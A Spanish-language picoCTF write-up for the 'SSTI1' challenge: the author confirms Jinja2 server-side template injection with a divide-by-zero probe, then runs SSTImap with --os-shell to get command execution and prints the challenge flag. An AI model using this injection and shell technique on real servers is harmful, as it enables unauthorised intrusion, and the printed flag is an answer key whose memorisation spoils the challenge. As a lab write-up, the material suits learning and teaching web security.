---
title: SST1
date: 2025-04-10 17:00:00 +0200
categories: [writeup, picoctf]
tags: [picoctf, ssti, sstimap, explotación web]     
image:
    path: https://picoctf.org/img/logos/pico-mark.svg
    alt: PicoCTF
---

>SSTI1
Author: Venax
Description
I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website here!
{: .prompt-tip }

El reto parece mostrar una web donde puedes introducir lo que quieras y lo mostrará en una página
Lanzamos la instancia y nos mostrará una web con un formulario y un botón para enviarlo. 
``` html
 Home

I built a cool website that lets you announce whatever you want!*
What do you want to announce: 

*Announcements may only reach yourself 
```
Cuando envías el formulario en el botón ok , te redirige a una web http://rescued-float.picoctf.net:54968/announce y allí aparecerá
el "anuncio" introducido en letras grandes

Al principio no tenía ni idea así que mire la pista que da, __Server Side Template Injection__ . Entonces fue cuando caí en la cuenta
muchos templates utilizan las llaves "{}" para parametrizar valores en los mismos, entonces comencé a experimentar con este tipo de 
inyección. 

Encontré una que produjo un error en el servidor al dividir por 0, lo que indica que en cierta manera el servidor ejecuta lo que está dentro de las llaves

>\{\{1/0\}\}

``` html
Internal Server Error

The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.
```

Para tratar de explotar si existiera alguna vulenerabilidad utilizo SSTIMap [hacktools/#ssti](../hacktools/#ssti)
La primera prueba me confirma que parece que la web utiliza un plugin que es inyectable
**jinja2 plugin has confirmed injection with tag '*'**

Ahora podría atacar el plugin en concreto pero voy a intentarlo de nuevo pasandole la flag --os-shell y ver que pasa
``` shell
(sstimap) pablo☠office sstimap$ python sstimap.py --url="http://rescued-float.picoctf.net:55270" -f  --os-shell

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║  _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |
                                                |_|
[*] Version: 1.2.3
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] Loaded plugins by categories: languages: 5; generic: 3; legacy_engines: 2; engines: 17
[*] Loaded request body types: 4

[*] Starting form detection...
[+] Form found: POST http://rescued-float.picoctf.net:55270/ "content="
[*] Scanning form with url: http://rescued-float.picoctf.net:55270/
[*] Testing if Body parameter 'content' is injectable
[*] Twig_v1 plugin is testing rendering with tag '*'
[*] Freemarker plugin is testing rendering with tag '*'
[*] Jinja2 plugin is testing rendering with tag '*'
[+] Jinja2 plugin has confirmed injection with tag '*' 
[+] SSTImap identified the following injection point:

  Body parameter: content
  Engine: Jinja2
  Injection: *
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, python code

[+] Run commands on the operating system.
posix-linux $ ls
__pycache__
app.py
flag
requirements.txt
posix-linux $ cat flag
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_3066c7bd}
```
Pues resulta que te podemos conseguir una shell y haciendo un simple ls y cat obtenemos la flag.

flag: **picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_3066c7bd}**